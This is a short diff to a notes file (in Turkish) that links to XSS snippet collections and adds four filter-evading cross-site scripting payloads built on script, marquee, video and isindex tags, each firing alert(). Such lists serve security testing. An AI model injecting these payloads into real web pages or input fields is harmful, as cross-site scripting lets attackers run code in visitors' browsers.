@@ -23,3 +23,9 @@
 Linkler:
 http://www.cnblogs.com/hustskyking/p/xss-snippets.html
 https://github.com/evilcos/xss.swf
+
+XSS:
+<script/src=data:,alert()>
+<marquee/onstart=alert()>
+<video/poster/onerror=alert()>
+<isindex/autofocus/onfocus=alert()>
